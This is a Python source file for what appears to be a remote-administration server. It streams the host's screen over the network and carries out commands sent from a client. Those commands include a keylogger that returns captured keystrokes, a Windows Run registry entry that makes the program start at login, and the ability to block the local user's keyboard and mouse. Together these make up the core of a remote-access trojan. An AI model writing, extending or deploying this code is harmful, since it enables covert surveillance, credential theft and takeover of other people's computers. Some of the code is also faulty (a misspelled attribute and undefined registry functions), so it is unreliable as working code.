"""import time
import numpy as np
import cv2
import mss.windows
from threading import Thread


mss.windows.CAPTUREBLT = 0
sct = mss.windows.MSS()
#monitor = {'top': 0, 'left': 0, 'width': 1600, 'height': 1200}
monitor = sct.monitors[1]
frameCounter = 0
frameSum = 0
iterations = 1000
minFrameDelta = 0.03333
#minFrameDelta = 0.041666
estimate = 0.01


#stops code excecution for precisely {seconds} seconds with high cpu usage
def SpinLock(seconds):
    end = 0
    start = perf_counter()
    while end - start < seconds:
        end = perf_counter()
        
    return

    #print("fps: " + str(round(1/(end - start))))


#stops code excecution for precisely {seconds} seconds with minimal cpu usage
def halt(seconds):
    while seconds > estimate:
        start = perf_counter()
        time.sleep(0.001)
        end = perf_counter()
        seconds -= (end - start)

    SpinLock(seconds)


def SendVideoStream():
    global frameSum
    for i in range(10000):
        frameStart = perf_counter()
        img = sct.grab(monitor)
        #cv2.imshow("stream", np.array(img))
        frameEnd = perf_counter()
        frameTimeElapsed = frameEnd - frameStart
        #print(abs(minFrameDelta - frameTimeElapsed))
        halt(minFrameDelta - frameTimeElapsed)
        frameWaitPeriodEnd = perf_counter()
        frameSum += frameWaitPeriodEnd - frameStart
        #print(frameWaitPeriodEnd - frameStart)

        print("fps: " + str(round(1/(frameWaitPeriodEnd - frameStart))))
    
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cv2.destroyAllWindows()

videoThread = Thread(target=SendVideoStream)
videoThread.start()"""

"""import mss
import mss.tools


sct = mss.mss()
#sct.shot(output='fullscreenMap.bmp')
pic = sct.grab(sct.monitors[1])
part = pic.rgb[:100]
print(part)
for i in range(100):
    print(ord(part[i:i+1]))
#mss.tools.to_png(pic.rgb, pic.size, output="somePic.png")"""

"""import numpy
from mss import mss
import socket
import cv2


UDPClientSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
UDPClientSock.connect(("127.0.0.1", 3389))

monitor = {'left': 0, 'top': 0, 'width': 500, 'height': 500}
with mss() as sct:
    img = sct.grab(monitor)
    rawBGR = numpy.array(img, dtype=numpy.uint8)[:, :, :3].tobytes()
    print(len(rawBGR))
    UDPClientSock.send(rawBGR[:65507])"""


from externals.vidgear.gears import ScreenGear
from externals.vidgear.gears import NetGear
from collections import deque
from helpers.executor import Executor
from helpers.inputListener import Listener
import cv2
from time import perf_counter
from threading import Thread
from multiprocess import Process
from numpy import flip
from dill import *



class Server():
    def __init__(self, ip):
        self.resolutionWidth = 1200
        self.resolutionHeight = 900

        self.executor = Executor()

        self.inpListener = Listener(grabKeyInput=False, grabMouseInput=False, blockInput=False)

        options = {"jpeg_compression": True,
                   "jpeg_compression_fastdct": True,
                   "jpeg_compression_fastupsample": True,
                   "jpeg_compression_quality": 50,
                   "rle_compression": True,
                   "rle_compression_strength": 3,
                   "bidirectional_mode": True,
                   "max_retries": 1
        }

        self.server = NetGear(
            address="192.168.1.132",
            port="5900",
            protocol="tcp",
            pattern=1,
            logging=False,
            **options
        )

        self.stream = ScreenGear(backend="mss",
                            monitor=1,
                            #colorspace="COLOR_BGR2RGB",
                            logging=False).start()

        self.__running = True


    def start(self):
        self.__proc = Thread(target=self.__start)
        self.__proc.daemon = True
        self.__proc.start()


    def __start(self):
        self.inpListener.start()

        self.additional_data = lambda: None
        while self.__running:
            frame = self.stream.read()
            frame = flip(frame[:, :, :3], 2)
            frame = cv2.resize(frame, (self.resolutionWidth, self.resolutionHeight), interpolation=cv2.INTER_LANCZOS4)
            return_data = self.server.send(frame, self.additional_data())
            if return_data:
                status_code, data = return_data
                if status_code:
                    return

                if len(data) == 2:
                    cmdQueue = deque(data[0])
                    inputQueue = deque(data[1])

                    self.executor.execute(inputQueue)

                    while cmdQueue: #while queue is not empty
                        item = cmdQueue.popleft()
                        cmd = item[0]
                        args = item[1:]
                        if cmd == "Start Cam":
                            pass

                        elif cmd == "Stop Cam":
                            pass

                        elif cmd == "Force Run":
                            keyHandle = OpenKeyEx(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=KEY_SET_VALUE)
                            SetValueEx(keyHandle, "remote", 0, REG_SZ, dirname(realpath(__file__)) + r"\helpers\run.py")
                            CloseKey(keyHandle)

                        elif cmd == "Block Input":
                            self.inpListener.blockInput = True

                        elif cmd == "Unblock Input":
                            self.inpListener.blockInput = False

                        elif cmd == "Start KeyLogger":
                            self.inpListener.grabKeyInput = True
                            self.additional_data = self.inpListener.fetch

                        elif cmd == "Stop KeyLogger":
                            self.inpLitener.grabKeyInput = False
                            self.additional_data = lambda: None

                        elif cmd == "Width Change":
                            self.resolutionWidth = args[0]

                        elif cmd == "Height Change":
                            self.resolutionHeight = args[0]

                        elif cmd == "Fps Change":
                            self.stream.minFrameDelta = args[0]

                else:
                    inputQueue = deque(data[0])
                    self.executor.execute(inputQueue)

            #halt(minFrameDelta - (frameEnd - frameStart))
            #framesTotalTime += perf_counter() - frameStart
            #cv2.imshow("frame", frame)
            #frameWaitPeriodEnd = perf_counter()
            #key = cv2.waitKey(1) & 0xFF
            #if key == ord("q"):
            #    break


    def close(self):
        self.__running = False
        self.__proc.join()
        self.inpListener.stop()
        self.executor.close()
        self.stream.stop()
        self.server.close()